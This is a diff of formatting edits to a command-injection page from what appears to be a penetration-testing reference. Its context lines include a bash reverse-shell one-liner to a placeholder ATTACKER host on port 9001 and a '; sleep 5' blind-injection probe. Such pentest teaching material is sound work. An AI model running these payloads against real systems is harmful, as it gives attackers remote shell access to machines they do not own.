@@ -1,6 +1,6 @@
 ---
 title: "Command Injection"
-sidebarTitle: "Command injection"
+sidebarTitle: "Command Injection"
 description: "Detect execution, preserve request encoding, choose shell-specific payloads, diagnose filters, and enumerate the resulting context."
 keywords: ["command injection", "cmdi", "shell separators", "ifs", "blind injection", "time delay", "filter bypass", "command injection spaces filtered", "shell argument separation whitespace filter"]
 ---
@@ -15,9 +15,7 @@ import { TargetContextBar } from "/snippets/target-context-bar.jsx";
 
 {/* COMMAND_SHORTCUT_START */}
 
-**Current starting checks:** [Web: Enumeration Methodology](/web/methodology) · [Web shell → terminal](/commands/web-shell-to-terminal)
-
-Preserve the normal request, vary one interpreter boundary and repeat output/timing controls. Then record process identity and network position before moving to a shell.
+**Current starting checks:** [Web: Enumeration Methodology](/web/methodology) · [Web shell → terminal](/commands/web-shell-to-terminal) — *Preserve the normal request, vary one interpreter boundary and repeat output/timing controls. Then record process identity and network position before moving to a shell.*
 
 {/* COMMAND_SHORTCUT_END */}
 
@@ -250,6 +248,8 @@ bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'
 > Blind command injection: confirm with time delay (`; sleep 5`) or an out-of-band DNS/HTTP callback before assuming it failed.
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
